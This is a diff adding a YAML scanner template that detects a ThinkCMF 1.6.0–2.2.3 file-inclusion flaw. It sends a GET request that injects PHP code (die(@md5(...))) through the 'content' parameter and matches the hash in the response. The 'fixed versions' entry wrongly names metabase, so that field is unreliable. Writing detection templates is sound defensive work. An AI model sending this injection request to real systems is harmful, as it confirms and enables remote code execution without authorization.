@@ -1,0 +1,25 @@
+id: thinkcmf-file-include
+
+info:
+  name: thinkCMF 文件包含
+  author: rain
+  severity: Critical
+  description: |
+    在受影响的版本中,可通过漏洞实现任意文件写入或任意代码执行
+    影响版本:
+      thinkCMFX 1.6.0-2.2.3
+    修复版本:
+      metabase version >= 0.40.5
+      metabase version >= 1.40.5
+  reference:
+    - https://www.thinkcmf.com/
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /?a=fetch&templateFile=public/index&prefix="&content=die(@md5(thinkcmf))
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+    expression: response.status == 200 && "3bedf9f6e16de1cb5403356aaa7bec38".bmatches(response.body)
+expression: r0()
